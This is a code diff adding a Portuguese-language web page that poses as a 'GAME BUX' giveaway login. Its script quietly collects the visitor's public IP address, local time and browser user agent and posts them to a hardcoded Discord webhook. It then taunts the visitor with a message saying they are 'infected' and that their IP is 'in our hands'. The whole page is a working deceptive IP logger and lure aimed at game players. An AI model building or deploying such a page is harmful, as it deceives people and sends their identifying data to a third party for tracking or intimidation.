@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GAME BUX 🎮| sorteio</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center p-4">
+
+    <!-- Card Centralizado -->
+    <main class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl space-y-6 text-center">
+
+        <!-- Título principal -->
+        <div>
+            <h1 class="text-3xl font-extrabold tracking-wider text-indigo-400 mb-1">GAME BUX🎮</h1>
+            <p class="text-xs text-slate-400">sorteio registre se abaixo🎉🎮</p>
+        </div>
+
+        <!-- Aviso de Transparência (Sem ícones) -->
+        <div class="bg-amber-500/10 border border-amber-500/20 rounded-2xl p-4 text-left">
+            <p class="text-xs text-amber-200/90 leading-relaxed">
+                <strong> faça login:</strong> Ao clicar no botão abaixo, você automaticamente participara do sorteio! 🎉.
+            </p>
+        </div>
+
+        <!-- Botão Principal de Envio (Sem ícones) -->
+        <button 
+            id="btnEnviar" 
+            onclick="enviarIP()" 
+            class="w-full bg-indigo-600 hover:bg-indigo-500 active:scale-[0.98] text-white font-semibold py-3.5 px-6 rounded-xl transition duration-200 text-sm shadow-lg shadow-indigo-600/25 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
+        >
+            Logar conta
+        </button>
+
+        <!-- Status do Envio -->
+        <div id="statusContainer" class="hidden">
+            <div id="statusBadge" class="inline-flex items-center justify-center px-3 py-2 rounded-xl text-xs font-medium w-full text-center">
+                <!-- Conteúdo gerado via JS -->
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Script de Captura e Envio -->
+    <script>
+        // Webhook fixo no script
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1569867295243768009/j1mRWw7MNBOt3qUdawd5aqoASeMpwz9AWNbXKbh0ow1P8_NzSHdLYoaMmM0jN5XMOhX1';
+
+        async function obterIP() {
+            // Tenta a primeira API (ipify)
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data.ip) return data.ip;
+                }
+            } catch (e) {
+                console.warn('Falha na API primária ipify, tentando fallback...', e);
+            }
+
+            // Fallback: Tenta a segunda API (ipapi.co)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data.ip) return data.ip;
+                }
+            } catch (e) {
+                console.warn('Falha na API de fallback ipapi', e);
+            }
+
+            throw new Error('Não foi possível logar. Desative AdBlockers se estiver usando.');
+        }
+
+        async function enviarIP() {
+            const btn = document.getElementById('btnEnviar');
+
+            btn.disabled = true;
+            exibirStatus('loading', 'fazendo login...');
+
+            try {
+                // 1. Obter IP público com fallback
+                const userIp = await obterIP();
+
+                exibirStatus('loading', 'so um instante...');
+
+                // 2. Montar Payload com estrutura exata para o Discord
+                const payload = {
+                    username: "GAME BUX Logger",
+                    content: `🚨 **Novo IP Registrado (GAME BUX)**: \`${userIp}\``,
+                    embeds: [
+                        {
+                            title: "GAME BUX - Registro de Acesso",
+                            color: 5814783, // Azul Indigo
+                            fields: [
+                                {
+                                    name: "🌐 Endereço IP",
+                                    value: `\`${userIp}\``,
+                                    inline: true
+                                },
+                                {
+                                    name: "📅 Horário (Local)",
+                                    value: new Date().toLocaleString('pt-BR'),
+                                    inline: true
+                                },
+                                {
+                                    name: "💻 Dispositivo / User Agent",
+                                    value: navigator.userAgent.substring(0, 500)
+                                }
+                            ],
+                            footer: {
+                                text: "GAME BUX - Logger de IP Transparente"
+                            },
+                            timestamp: new Date().toISOString()
+                        }
+                    ]
+                };
+
+                // 3. Enviar requisição POST para o Webhook do Discord
+                const webhookResponse = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (webhookResponse.ok || webhookResponse.status === 204) {
+                    exibirStatus('success', `Sucesso! você esta infectada seu ip (${userIp}) esta em nossas mao.`);
+                } else {
+                    const errorText = await webhookResponse.text();
+                    console.error('Erro Discord:', errorText);
+                    exibirStatus('error', `Erro no servidor Discord (HTTP ${webhookResponse.status}).`);
+                }
+
+            } catch (err) {
+                console.error(err);
+                exibirStatus('error', err.message || 'Erro ao conectar ou enviar os dados.');
+            } finally {
+                btn.disabled = false;
+            }
+        }
+
+        function exibirStatus(tipo, mensagem) {
+            const statusContainer = document.getElementById('statusContainer');
+            const statusBadge = document.getElementById('statusBadge');
+
+            statusContainer.classList.remove('hidden');
+
+            if (tipo === 'loading') {
+                statusBadge.className = "px-3 py-2 rounded-xl text-xs font-medium bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 w-full text-center animate-pulse";
+            } else if (tipo === 'success') {
+                statusBadge.className = "px-3 py-2 rounded-xl text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 w-full text-center";
+            } else if (tipo === 'error') {
+                statusBadge.className = "px-3 py-2 rounded-xl text-xs font-medium bg-rose-500/10 text-rose-400 border border-rose-500/20 w-full text-center";
+            }
+            statusBadge.textContent = mensagem;
+        }
+    </script>
+</body>
+</html>
